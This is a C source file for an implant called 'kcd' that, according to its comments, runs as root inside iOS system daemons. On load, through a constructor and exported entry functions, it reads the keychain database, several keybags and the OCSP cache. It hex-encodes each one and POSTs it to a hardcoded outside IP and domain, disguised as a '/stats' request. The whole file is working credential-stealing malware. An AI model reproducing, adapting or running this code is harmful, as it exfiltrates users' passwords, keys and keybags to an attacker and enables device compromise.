// kcd — keychain file dumper for root context (configd/powerd)
// Pure POSIX file reads (no SecItem API — injected processes have invalid
// code signatures and keychaind denies them). Reads the keychain database
// and keybags, uploads via raw HTTP.
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

static int g_done = 0;

static void http_post(const char *path, const char *category, const char *desc,
                      const unsigned char *hex, int hex_len) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(80);
    a.sin_addr.s_addr = inet_addr("176.122.134.61");
    if (connect(fd, (struct sockaddr*)&a, sizeof(a)) < 0) { close(fd); return; }
    int body_len = 200 + hex_len;
    char hdr[512];
    int hl = snprintf(hdr, 500,
        "POST /stats HTTP/1.1\r\nHost: go.szjz.fun\r\n"
        "Content-Type: application/json\r\nContent-Length: %d\r\n"
        "Connection: close\r\n\r\n", body_len);
    write(fd, hdr, hl);
    char *body = malloc(body_len + 64);
    if (!body) { close(fd); return; }
    int pos = snprintf(body, 190,
        "{\"path\":\"%s\",\"category\":\"%s\",\"description\":\"%s\","
        "\"size\":%d,\"deviceUUID\":\"kcd\",\"data\":\"",
        path, category, desc, hex_len / 2);
    memcpy(body + pos, hex, hex_len);
    pos += hex_len;
    body[pos++] = '"';
    body[pos++] = '}';
    write(fd, body, pos);
    free(body);
    char rb[256];
    while (read(fd, rb, sizeof(rb)) > 0) {}
    close(fd);
}

static void send_file(const char *tag, const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        const char *msg = "OPEN_FAIL";
        char hex[24]; int hp = 0;
        for (const char *p = msg; *p; p++) {
            hex[hp++] = "0123456789abcdef"[(*p >> 4) & 15];
            hex[hp++] = "0123456789abcdef"[*p & 15];
        }
        http_post(tag, "kcd", "err", (const unsigned char*)hex, hp);
        return;
    }
    struct stat st;
    if (fstat(fd, &st) < 0 || st.st_size <= 0 || st.st_size > 6*1024*1024) { close(fd); return; }
    int sz = (int)st.st_size;
    unsigned char *buf = malloc(sz);
    if (!buf) { close(fd); return; }
    int got = 0;
    while (got < sz) {
        int n = (int)read(fd, buf + got, sz - got);
        if (n <= 0) break;
        got += n;
    }
    close(fd);
    if (got <= 0) { free(buf); return; }
    char *hex = malloc((size_t)got * 2 + 1);
    if (!hex) { free(buf); return; }
    static const char hc[] = "0123456789abcdef";
    for (int i = 0; i < got; i++) {
        hex[i*2] = hc[buf[i] >> 4];
        hex[i*2+1] = hc[buf[i] & 15];
    }
    http_post(tag, "kcd", "keychain", (const unsigned char*)hex, got * 2);
    free(hex);
    free(buf);
}

static void dump_all(void) {
    if (g_done) return;
    g_done = 1;
    send_file("kcd_canary", "/System/Library/CoreServices/SystemVersion.plist");
    send_file("kcd_keychain2db", "/var/Keychains/keychain-2.db");
    send_file("kcd_System_keybag", "/var/Keychains/System.keybag");
    send_file("kcd_Backup_keybag", "/var/Keychains/Backup.keybag");
    send_file("kcd_device_kb", "/var/Keychains/device.kb");
    send_file("kcd_persona_kb", "/var/keybags/persona.kb");
    send_file("kcd_usersession_kb", "/var/keybags/usersession.kb");
    send_file("kcd_ocsp", "/var/Keychains/ocspcache.sqlite3");
}

__attribute__((visibility("default")))
int entry_main(void *ctx) { dump_all(); return 0; }

__attribute__((visibility("default")))
void plugin_main(void) { dump_all(); }

__attribute__((constructor))
static void kcd_init(void) { dump_all(); }
